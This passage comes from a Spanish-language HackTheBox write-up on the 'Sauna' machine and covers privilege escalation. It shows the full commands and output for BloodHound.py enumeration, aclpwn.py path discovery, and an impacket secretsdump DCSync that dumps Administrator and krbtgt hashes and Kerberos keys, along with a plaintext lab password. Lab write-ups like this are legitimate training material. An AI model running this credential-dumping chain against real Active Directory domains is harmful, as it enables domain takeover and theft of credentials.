&lt;/div&gt;&lt;p&gt;Utilizamos EvilWinrm con las credenciales de svc_loanmgr:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_192715.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Utilizamos &lt;code&gt;Bloodhound.py&lt;/code&gt; para obtener informacion con el usuario &lt;code&gt;svc_loanmgr&lt;/code&gt; importamos los datos a bloodhound, luego de esto utilizamos &lt;code&gt;Aclpwn.py&lt;/code&gt; para poder encontrar una ruta para obtener privilegios de administrador de la misma forma que la maquina &lt;a href=&#34;https://sckull.github.io/posts/forest/&#34;&gt;&lt;strong&gt;Forest de HackTheBox&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tools/BloodHound.py/sauna# python ../bloodhound -u svc_loanmgr -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Moneymakestheworldgoround!&amp;#39;&lt;/span&gt; -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c all
INFO: Found AD domain: egotistical-bank.local
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; domains
INFO: Found &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; domains in the forest
INFO: Found &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; users
INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found &lt;span class=&#34;m&#34;&gt;51&lt;/span&gt; groups
INFO: Found &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; trusts
INFO: Starting computer enumeration with &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 01M 15S
root@aoiri:~/tools/BloodHound.py/sauna# zip -r sauna.zip *.json
updating: computers.json &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;deflated 75%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
updating: domains.json &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;deflated 85%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
updating: groups.json &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;deflated 95%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
updating: users.json &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;deflated 92%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tools/BloodHound.py/sauna#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_193146.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;bloodhound&#34;&gt;Bloodhound&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_204111.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tools/aclpwn.py# python aclpwn.py -f svc_loanmgr -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;Moneymakestheworldgoround!&amp;#39;&lt;/span&gt; -ft user -t EGOTISTICAL-BANK.LOCAL -tt domain -d EGOTISTICAL-BANK.LOCAL -du neo4j -dp root -s 10.10.10.175
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
Path: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GetChangesAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EGOTISTICAL-BANK.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DCSync -&amp;gt; &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finished running tasks
root@aoiri:~/tools/aclpwn.py# 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/sauna/Screenshot_20200226_193227.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la ejecucion de Aclpwn nos aparece que el usuario svc_loanmgr ya tiene permisos para ejecutar DCSync. Sabiendo esto, utilizamos secretsdump.py de impacket para obtener los hashes de los usuarios registrados en la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:Secretsdump.py&#34; data-lang=&#34;python:Secretsdump.py&#34;&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;nd&#34;&gt;@aoiri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tools&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;impacket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;examples&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# python secretsdump.py svc_loanmgr:&amp;#39;Moneymakestheworldgoround!&amp;#39;@10.10.10.175&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Impacket&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v0&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;.9.20&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Copyright&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SecureAuth&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Corporation&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RemoteOperations&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DCERPC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Runtime&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rpc_s_access_denied&lt;/span&gt; 
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Dumping&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Credentials&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;domain&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lmhash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nthash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Using&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DRSUAPI&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;get&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;NTDS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DIT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;secrets&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d9485863c1e9e05851aa40cbb4ab9dff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Guest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;501&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d6cfe0d16ae931b73c59d7e0c089c0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;krbtgt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;502&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a8899428cad97676ff802229e466e2c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;HSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1103&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;58&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a52d36c84fb7f5f1beab9a201db1dd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;FSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1105&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;58&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a52d36c84fb7f5f1beab9a201db1dd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;svc_loanmgr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cb31797c39a9b170b04058ba2bba48c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;SAUNA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aad3b435b51404eeaad3b435b51404ee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ba6af99033d007cdc1a1fbff2af7c4e7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:::&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Kerberos&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;grabbed&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;987e26&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;145e4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d0e4a6600b7ec0ece74997651d0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d5f15d689b1ce5&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;krbtgt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;krbtgt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c824894df4c4c621394c079b42032fa9&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;krbtgt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c170d5dc3edfc1d9&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;HSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5875&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;HSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;aes128&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cts&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hmac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;96&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;909929&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b037d273e6a8828c362faa59e9&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;EGOTISTICAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BANK&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOCAL&lt;/span&gt;\&lt;span class=&#34;n&#34;&gt;HSmith&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cbc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c73b99168d3f8c7&lt;/span&gt;
